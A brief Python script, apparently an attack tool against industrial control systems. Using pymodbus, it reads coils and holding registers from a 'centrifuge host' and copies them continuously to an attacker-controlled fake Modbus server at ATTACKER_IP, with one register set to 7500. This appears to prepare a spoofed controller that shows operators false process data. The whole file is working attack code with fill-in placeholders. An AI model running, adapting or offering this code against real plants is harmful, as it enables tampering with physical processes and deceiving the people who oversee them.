from pymodbus.constants import Endian
from pymodbus.payload import BinaryPayloadDecoder
from pymodbus.client.sync import ModbusTcpClient

ATTACKER_IP = '' #change me
REAL_SERVER_IP = '' #IP for the centrifuge host

client_real_server = ModbusTcpClient(REAL_SERVER_IP, port=502)  # real server.
client_fake_server = ModbusTcpClient(ATTACKER_IP, port=502) #our fake server
connection = client_real_server.connect()


if connection:
    client_fake_server.write_registers(1, 7500, unit=1)
    real_coils = client_real_server.read_coils(address=0x00, count=0x05, unit=0x01).bits
    client_fake_server.write_coils(0, real_coils[:], unit=1)
    while 1==1:
        #read the real coils
        real_coils = client_real_server.read_coils(address=0x00, count=0x05, unit=0x01).bits
        print(real_coils[0:4])
        #read the real registers
        real_registers = client_real_server.read_holding_registers(address=0x00, count=5,unit=0x01).registers
        print(real_registers)
        #populate our fake server with real-time data from real server
        client_fake_server.write_registers(0, real_registers[0:1], unit=1)
        client_fake_server.write_registers(2, real_registers[2:], unit=1)
    client_real_server.close()
    client_fake_server.close()

else:
    print('Connection lost, Try again')
